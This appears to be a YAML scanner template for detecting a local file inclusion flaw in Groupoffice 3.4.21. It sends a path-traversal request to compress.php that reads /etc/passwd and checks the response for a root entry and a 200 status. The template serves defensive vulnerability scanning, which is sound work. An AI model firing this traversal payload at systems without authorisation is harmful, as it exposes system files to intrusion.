id: "groupoffice-lfi"
name: "Groupoffice 3.4.21 - Local File Inclusion"
severity: "high"
description: "Groupoffice 3.4.21 is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "groupoffice"
  - "lfi"
  - "traversal"
  - "vuln"
cwe: "CWE-22"
reference: "https://cxsecurity.com/issue/WLB-2018020249"
spaExclusion: true
request:
  method: "GET"
  path: "/compress.php?file=../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
